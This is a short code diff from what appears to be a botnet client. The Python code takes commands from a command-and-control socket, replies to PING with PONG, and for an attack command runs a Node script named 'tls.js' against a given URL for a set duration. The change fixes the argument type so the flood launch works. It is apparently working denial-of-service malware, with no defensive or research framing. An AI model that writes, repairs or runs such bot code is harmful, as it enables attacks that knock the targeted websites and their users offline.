@@ -211,7 +211,7 @@ def main():
                     url = args[1]
                     duration = int(args[2])
                     end_time = time.time() + duration 
-                    subprocess.run(["node", "new/tls.js", url, end_time])
+                    subprocess.run(["node", "new/tls.js", url, str(end_time)])
                 elif command == 'PING':
                     c2.send('PONG'.encode())
             except:
